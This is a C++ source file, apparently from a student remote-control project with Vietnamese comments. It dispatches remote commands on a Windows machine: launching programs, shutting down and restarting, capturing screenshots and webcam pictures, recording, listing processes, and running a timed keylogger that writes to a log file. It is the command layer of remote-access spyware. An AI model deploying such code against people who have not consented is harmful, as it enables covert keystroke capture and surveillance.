#include "executeCommand.h"

// Loại bỏ g_current_sender vì server không gửi email nữa

int parse_keylogger_duration(const string& command) {
  size_t pos = command.find("keylogger");
  if (pos == string::npos) return 30;  // default 30 seconds

  string remaining = command.substr(pos + 9);  // skip "keylogger"

  // Tìm số trong chuỗi
  regex numberRegex(R"(\d+)");
  smatch match;
  if (regex_search(remaining, match, numberRegex)) {
    return stoi(match.str());
  }

  return 30;  // default
}

static string trim_command_internal(string command) {
  command.erase(command.begin(), find_if(command.begin(), command.end(),
                                         [](int ch) { return !isspace(ch); }));
  command.erase(find_if(command.rbegin(), command.rend(),
                        [](int ch) { return !isspace(ch); })
                    .base(),
                command.end());
  return command;
}

void handle_start_program(const string& command) {
  string prog = command.substr(13);  // After "start_program"
  prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!prog.empty()) {
    cout << "Starting program: " << prog << endl;
    HINSTANCE result =
        ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    if (reinterpret_cast<INT_PTR>(result) <= 32) {
      cerr << "Failed to start program. Error code: "
           << reinterpret_cast<INT_PTR>(result) << endl;
    } else {
      cout << "Program started successfully: " << prog << endl;
    }
  } else {
    cout << "No program specified for start_program command" << endl;
  }
}

// void handle_shutdown_program(const string& command) {
//   string proc = command.substr(16);
//   proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
//                                    [](int ch) { return !isspace(ch); }));

//   if (!proc.empty()) {
//     shutdown_program(proc);
//     cout << "Shutdown program command executed for: " << proc << endl;
//   } else {
//     cout << "No process specified for shutdown_program command" << endl;
//   }
// }



void handle_get_picture(const string& outFile) { take_picture(outFile); }

void handle_get_screenshot(const string& outFile) { take_screenshot(outFile); }

void handle_list_programs(const string& outFile) {
  list_programs_to_file(outFile);  // Running programs
}

void handle_list_processes(const string& outFile) {
  list_processes_to_file(outFile);  // Processes with PID
}

void handle_list_installed(const string& outFile) {
  list_installed_programs_to_file(outFile);  // Installed programs
}

void handle_keylogger(const string& command, const string& outFile) {
  istringstream iss(command);
  string cmd;
  int duration = 10; // mặc định
  iss >> cmd >> duration;

  cout << "Starting keylogger for " << duration << " seconds..." << endl;
  start_keylogger(outFile, duration);
}

void handle_shutdown() {
  cout << "Initiating system shutdown..." << endl;
  if (system("shutdown /s /t 0") != 0) {
    cerr << "Shutdown command failed" << endl;
  } else {
    cout << "Shutdown initiated successfully" << endl;
  }
}

void handle_restart() {
    cout << "Restarting system..." << endl;
    system("shutdown /r /t 5 /c \"Remote restart initiated\"");
}

void handle_cancel_shutdown() {
    cout << "Cancelling shutdown/restart..." << endl;
    system("shutdown /a");
}

void handle_stop_recording() {
  cout << "[Server] Stopping recording..." << endl;
  stop_recording();
}

void handle_start_recording(const std::string& outFile) {
  cout << "[Server] Starting recording and saving to: " << outFile << endl;
  start_recording(outFile);
}

void execute_command(const string& command) {
  cout << "[Execute] Processing command: " << command << endl;

  if (command.find("start_program") == 0) {
        handle_start_program(command);
  } else if (command == "shutdown") {
        handle_shutdown();
  } else if (command == "restart") {
        handle_restart();
  } else if (command == "cancel_shutdown") {
        handle_cancel_shutdown();
  } else if (command == "stop_recording") {
        handle_stop_recording();
  } else if (command.find("keylogger") == 0) {
        handle_keylogger(command, "C:/MMT/keylog.txt");
  } else {
    cout << "[Execute] Unknown command: " << command << endl;
  }
}

void execute_command_with_file(const string& command,
                               const string& outputFile) {
  cout << "[Execute] Processing command with file output: " << command << endl;

  if (command == "get_screenshot") {
        handle_get_screenshot(outputFile);
  } else if (command == "get_picture") {
        handle_get_picture(outputFile);
  } else if (command == "list_program") {
        handle_list_programs(outputFile);
  } else if (command == "list_process") {
        handle_list_processes(outputFile);
  } else if (command == "list_installed") {
        handle_list_installed(outputFile);
  } else if (command.find("keylogger") == 0) {
        handle_keylogger(command, outputFile);
  } else if (command == "start_recording") {
        handle_start_recording(outputFile);
  } else {
    cout << "[Execute] Unknown command with file: " << command << endl;
    // Tạo file error
    ofstream errorFile(outputFile);
    if (errorFile.is_open()) {
      errorFile << "Error: Unknown command - " << command << endl;
      errorFile.close();
    }
  }
}